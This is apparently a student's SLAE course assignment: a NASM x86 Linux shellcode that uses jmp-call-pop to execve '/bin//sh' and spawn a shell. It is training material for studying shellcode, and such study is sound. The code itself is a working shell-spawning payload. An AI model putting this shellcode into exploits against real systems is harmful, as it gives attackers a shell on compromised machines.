; Filename: sh.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 6

global _start			

section .text
_start:
	jmp get_addr

exec_sh:
	xor ecx, ecx		; to zero out ecx
	mul ecx			; to zero out eax and edx
	mov al, 0x0b		; 0x0b = sys_execve
	pop ebx			; address of "/bin//sh" is stored in ebx
	int 0x80

get_addr:
	call exec_sh		; now address of "/bin//sh" is pushed onto the stack
	shell: db 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68
